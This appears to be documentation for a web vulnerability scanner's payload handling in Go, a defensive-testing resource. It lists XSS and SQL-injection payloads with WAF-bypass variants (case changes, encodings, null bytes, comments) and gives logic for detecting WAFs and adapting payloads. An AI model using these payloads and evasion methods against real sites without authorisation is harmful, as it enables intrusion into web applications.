# Payload Management

**WAF bypass techniques, encoding strategies, and systematic testing approaches.**

## Payload Structure

### Basic Payload Design

```go
type Payload struct {
    Input      string            // Payload to inject
    Reflection string            // Expected reflection (for detection)
    Encoding   string            // Context: html, js, url, attr
    Tags       []string          // Categories: basic, waf-bypass, advanced
    Metadata   map[string]string // Additional context
}
```

## WAF Bypass Techniques

### XSS Bypass Strategies

**Basic Payloads:**

```go
var basicXSSPayloads = []Payload{
    {Input: "<script>alert(1)</script>", Reflection: "<script>alert(1)</script>", Tags: []string{"basic"}},
    {Input: "<img src=x onerror=alert(1)>", Reflection: "onerror=alert(1)", Tags: []string{"basic"}},
    {Input: "<svg onload=alert(1)>", Reflection: "onload=alert(1)", Tags: []string{"basic"}},
}
```

**Case Variation:**

```go
var caseVariationPayloads = []Payload{
    {Input: "<ScRiPt>alert(1)</sCrIpT>", Reflection: "alert(1)", Tags: []string{"waf-bypass", "case"}},
    {Input: "<IMG SRC=x ONERROR=alert(1)>", Reflection: "ONERROR=alert(1)", Tags: []string{"waf-bypass", "case"}},
}
```

**Encoding Bypass:**

```go
var encodingBypassPayloads = []Payload{
    // HTML entity encoding
    {Input: "&#60;script&#62;alert(1)&#60;/script&#62;", Reflection: "alert(1)", Tags: []string{"waf-bypass", "encoding"}},

    // URL encoding
    {Input: "%3Cscript%3Ealert(1)%3C/script%3E", Reflection: "alert(1)", Tags: []string{"waf-bypass", "url-encoding"}},

    // Unicode encoding
    {Input: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", Reflection: "alert(1)", Tags: []string{"waf-bypass", "unicode"}},

    // Mixed encoding
    {Input: "<%00script>alert(1)</%00script>", Reflection: "alert(1)", Tags: []string{"waf-bypass", "null-byte"}},
}
```

**Obfuscation:**

```go
var obfuscationPayloads = []Payload{
    // Comment injection
    {Input: "<script>/**/alert/**/(/*/1/*/)/**/</script>", Reflection: "alert", Tags: []string{"waf-bypass", "obfuscation"}},

    // String concatenation
    {Input: "<script>alert(String.fromCharCode(49))</script>", Reflection: "String.fromCharCode", Tags: []string{"waf-bypass", "obfuscation"}},

    // Alternative syntax
    {Input: "<svg/onload=alert(1)>", Reflection: "onload=alert(1)", Tags: []string{"waf-bypass", "syntax"}},
}
```

**Context-Specific:**

```go
var contextSpecificPayloads = []Payload{
    // Breaking out of attribute
    {Input: "\" onload=\"alert(1)", Reflection: "onload=\"alert(1)", Tags: []string{"attr-escape"}},

    // JavaScript context
    {Input: "';alert(1);//", Reflection: "alert(1)", Tags: []string{"js-context"}},

    // Style attribute
    {Input: "x:expression(alert(1))", Reflection: "expression(alert(1))", Tags: []string{"css-context"}},
}
```

## SQLi Bypass Strategies

### Comment-Based Bypass

```go
var sqlCommentBypass = []Payload{
    {Input: "1' OR '1'='1'--", Tags: []string{"sqli", "basic"}},
    {Input: "1' OR '1'='1'/*", Tags: []string{"sqli", "comment"}},
    {Input: "1' OR '1'='1'#", Tags: []string{"sqli", "comment"}},
}
```

### Whitespace Bypass

```go
var sqlWhitespaceBypass = []Payload{
    {Input: "1'/**/OR/**/1=1--", Tags: []string{"sqli", "waf-bypass", "whitespace"}},
    {Input: "1'%0AOR%0A1=1--", Tags: []string{"sqli", "waf-bypass", "newline"}},
    {Input: "1'%09OR%091=1--", Tags: []string{"sqli", "waf-bypass", "tab"}},
}
```

### Case and Encoding

```go
var sqlEncodingBypass = []Payload{
    {Input: "1' oR 1=1--", Tags: []string{"sqli", "waf-bypass", "case"}},
    {Input: "1' %6Fr 1=1--", Tags: []string{"sqli", "waf-bypass", "url-encoding"}},
    {Input: "1' UnIoN SeLeCt--", Tags: []string{"sqli", "waf-bypass", "case"}},
}
```

## Context-Aware Encoding

### Encoding by Context

```go
func encodeForContext(payload string, context string) string {
    switch context {
    case "html":
        return htmlEncode(payload)
    case "js":
        return jsEncode(payload)
    case "url":
        return url.QueryEscape(payload)
    case "attr":
        return attrEncode(payload)
    default:
        return payload
    }
}

func htmlEncode(s string) string {
    return html.EscapeString(s)
}

func jsEncode(s string) string {
    // Escape quotes and backslashes
    s = strings.ReplaceAll(s, "\\", "\\\\")
    s = strings.ReplaceAll(s, "'", "\\'")
    s = strings.ReplaceAll(s, "\"", "\\\"")
    return s
}

func attrEncode(s string) string {
    // HTML attribute encoding (quotes and angle brackets)
    s = strings.ReplaceAll(s, "\"", "&quot;")
    s = strings.ReplaceAll(s, "'", "&#39;")
    s = strings.ReplaceAll(s, "<", "&lt;")
    s = strings.ReplaceAll(s, ">", "&gt;")
    return s
}
```

## Systematic Testing Approach

### Payload Prioritization

```go
type PayloadSet struct {
    Basic      []Payload // Test first - fast detection
    WAFBypass  []Payload // Test if basic fails
    Advanced   []Payload // Test for comprehensive coverage
}

func (p *Plugin) TestWithPriority(ctx context.Context, target *Target) ([]Finding, error) {
    var findings []Finding

    // 1. Try basic payloads first
    findings = testPayloads(ctx, target, p.PayloadSet.Basic)
    if len(findings) > 0 {
        return findings, nil // Found with basic, no need for advanced
    }

    // 2. Try WAF bypass techniques
    findings = testPayloads(ctx, target, p.PayloadSet.WAFBypass)
    if len(findings) > 0 {
        return findings, nil
    }

    // 3. Try advanced/context-specific
    findings = testPayloads(ctx, target, p.PayloadSet.Advanced)
    return findings, nil
}
```

### Adaptive Payload Selection

```go
func selectPayloads(target *Target, response *Response) []Payload {
    var payloads []Payload

    // Detect WAF signatures
    if detectsWAF(response) {
        payloads = append(payloads, wafBypassPayloads...)
    } else {
        payloads = append(payloads, basicPayloads...)
    }

    // Context detection
    if isJavaScriptContext(response) {
        payloads = append(payloads, jsContextPayloads...)
    }

    return payloads
}

func detectsWAF(response *Response) bool {
    wafSignatures := []string{
        "cloudflare",
        "incapsula",
        "mod_security",
        "blocked by",
    }

    body := strings.ToLower(response.Body)
    for _, sig := range wafSignatures {
        if strings.Contains(body, sig) {
            return true
        }
    }
    return false
}
```

## Payload Generation

### Dynamic Payload Generation

```go
func generateXSSPayloads(basePayload string) []Payload {
    var payloads []Payload

    // Original
    payloads = append(payloads, Payload{Input: basePayload})

    // Case variations
    payloads = append(payloads, Payload{Input: randomCase(basePayload)})

    // Encoding variations
    payloads = append(payloads, Payload{Input: urlEncode(basePayload)})
    payloads = append(payloads, Payload{Input: htmlEncode(basePayload)})

    // Obfuscation
    payloads = append(payloads, Payload{Input: addComments(basePayload)})

    return payloads
}

func randomCase(s string) string {
    result := []rune{}
    for _, c := range s {
        if rand.Intn(2) == 0 {
            result = append(result, unicode.ToUpper(c))
        } else {
            result = append(result, unicode.ToLower(c))
        }
    }
    return string(result)
}
```

## Deduplication

### Payload Normalization

```go
func normalizePayload(p Payload) string {
    // Normalize for deduplication
    s := strings.ToLower(p.Input)
    s = strings.ReplaceAll(s, " ", "")
    s = strings.ReplaceAll(s, "\t", "")
    s = strings.ReplaceAll(s, "\n", "")
    return s
}

func deduplicateFindings(findings []Finding) []Finding {
    seen := make(map[string]bool)
    unique := []Finding{}

    for _, f := range findings {
        key := fmt.Sprintf("%s:%s:%s", f.Type, f.Parameter, normalizePayload(Payload{Input: f.Payload}))
        if !seen[key] {
            seen[key] = true
            unique = append(unique, f)
        }
    }

    return unique
}
```

## Best Practices

1. **Prioritize Basic Payloads**: Test simple payloads first before complex evasion
2. **Context Detection**: Detect injection context and select appropriate payloads
3. **WAF Detection**: Identify WAF presence and adapt payload strategy
4. **Encoding Awareness**: Match encoding to injection context (HTML, JS, URL)
5. **Deduplication**: Normalize payloads to avoid reporting same vulnerability multiple times
6. **Rate Limiting**: Batch payloads with delays to avoid overwhelming target
